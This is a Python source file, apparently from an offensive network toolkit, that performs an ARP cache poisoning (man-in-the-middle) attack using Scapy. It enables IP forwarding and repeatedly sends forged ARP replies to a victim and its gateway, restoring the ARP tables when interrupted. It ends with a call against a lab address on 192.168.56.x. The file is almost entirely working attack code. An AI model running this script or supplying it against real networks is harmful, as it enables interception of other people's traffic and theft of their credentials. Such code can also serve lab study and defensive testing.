#! /usr/bin/env python3
#Sends forged ARP replies to poison target’s ARP cache.
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.sendrecv import sendp
from packinjection.recon.host.arp_scan import scan
from packinjection.utils.inet import get_gw
from packinjection.utils.inet import select_iface
from os import system
from sys import exit
from time import sleep
from click import echo
def enable_ip_forwarding():
	echo("\n[*] Enabling IP Forwarding...")
	system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
	echo("\n[*] Disabling IP Forwarding...")
	system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison(victim_ip, gw_ip, victim_mac, gw_mac, iface):
	sendp(Ether(dst=victim_mac)/ARP(op = 2, pdst = victim_ip, psrc = gw_ip, hwdst= victim_mac), verbose=False, iface=iface)
	sendp(Ether(dst=gw_mac)/ARP(op = 2, pdst = gw_ip, psrc = victim_ip, hwdst= gw_mac), verbose=False, iface=iface)

def unpoison(victim_ip, gw_ip, victim_mac, gw_mac, iface):
#	echo("\n[*] Restoring Targets...")
	sendp(Ether(dst=gw_mac)/ARP(op = 2, pdst = gw_ip, psrc = victim_ip, hwdst = gw_mac, hwsrc = victim_mac), iface=iface, verbose=False) #, count = 15)
	sendp(Ether(dst=victim_mac)/ARP(op = 2, pdst = victim_ip, psrc = gw_ip, hwdst = victim_mac, hwsrc = gw_mac), iface=iface, verbose=False) #, count = 15)
#	disable_ip_forwarding()

def attack(victim_ip):
	iface = select_iface(victim_ip)
#	print(iface)
	try:
		gw_ip = get_gw(victim_ip)
#		print(gw_ip)
		if gw_ip == '0.0.0.0': gw_ip = '192.168.56.104' ######################fix this
		victims = scan(victim_ip, verbose=0, interface=iface)
		victims = [ v for v in victims if v[1] != gw_ip]
		if len(victims) == 0:
			echo("[!] Couldn't Find Victim MAC Address. Host is probably down.")
			exit(1)
	except Exception as e:
		echo(f"[!] {e}")
		exit(2)
	gw_mac = scan(gw_ip,result="1mac", verbose=0, interface=iface)
	print(gw_ip, gw_mac)
	enable_ip_forwarding()
	echo("[*] Poisoning Targets...")
	poisoning = True
#	victim_ip='192.168.56.105'
#	victim_mac='08:00:27:6c:5e:2b'
	try:
		while poisoning:
			for victim_mac, victim_ip in victims:
#				print(victim_mac, victim_ip)
				poison(victim_ip, gw_ip, victim_mac, gw_mac, iface=iface)
			sleep(0.2)

	except KeyboardInterrupt:
		echo("\n[!] Stopping attack, restoring ARP tables...")
		poisoning = False
		sleep(1)
		for _ in range(10):
			for victim_mac, victim_ip in victims:
				unpoison(victim_ip, gw_ip, victim_mac, gw_mac, iface=iface)
		disable_ip_forwarding()

	except Exception as e:
		echo(f"[!] {e}")
		poisoning = False
		sleep(1)
		for _ in range(10):
			for victim_mac, victim_ip in victims:
				unpoison(victim_ip, gw_ip, victim_mac, gw_mac, iface=iface)
		disable_ip_forwarding()

attack("192.168.56.105")
# what if direct link (no gateway) -> choose hosts
